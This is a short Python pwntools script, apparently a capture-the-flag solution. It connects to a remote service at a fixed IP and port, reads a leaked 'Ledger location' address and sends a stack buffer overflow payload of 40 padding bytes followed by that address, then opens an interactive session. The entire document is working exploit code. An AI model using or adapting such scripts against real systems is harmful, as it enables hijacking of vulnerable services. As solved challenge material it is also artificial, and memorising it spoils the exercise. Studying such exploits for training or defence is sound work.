from pwn import *

p = remote("134.112.58.12", 10001)

offset = 40

p.recvuntil(b"Ledger location: ")
addr = int(p.recvline().strip(), 16)

log.success(f"ledger = {hex(addr)}")

payload = b"A" * offset + p64(addr)

p.sendline(payload)

p.interactive()